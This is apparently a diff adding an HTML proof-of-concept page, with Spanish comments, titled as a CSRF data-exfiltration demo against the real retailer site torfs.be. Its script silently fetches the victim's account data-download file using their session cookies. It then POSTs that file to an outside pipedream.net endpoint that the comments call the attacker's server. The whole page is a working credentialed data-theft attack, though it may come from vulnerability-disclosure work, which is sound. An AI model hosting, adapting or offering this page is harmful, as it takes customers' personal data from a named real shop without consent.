@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Demo CSRF Exfiltración Datos - Torfs</title>
+</head>
+<body>
+  <h2>Procesando...</h2>
+  <script>
+    // URL del endpoint vulnerable en torfs.be
+    const dataDownloadUrl = "https://www.torfs.be/on/demandware.store/Sites-Torfs-Webshop-BE-Site/nl_BE/Account-DataDownload";
+    
+    // URL de tu servidor atacante donde enviarás el archivo
+    const attackerUrl = "https://eoozwutroaqr7ij.m.pipedream.net";
+
+    // Hacer fetch del archivo con cookies incluidas (envía dwsid automáticamente)
+    fetch(dataDownloadUrl, {
+      method: "GET",
+      credentials: "include"  // importante para enviar cookies de torfs.be
+    })
+    .then(response => response.blob())
+    .then(blob => {
+      // Preparar el archivo para enviar por POST a atacante
+      const formData = new FormData();
+      formData.append('file', blob, 'datos_victima');
+
+      // Enviar al servidor atacante
+      fetch(attackerUrl, {
+        method: "POST",
+        body: formData
+      });
+    })
+    .catch(e => console.error("Error:", e));
+  </script>
+</body>
+</html>
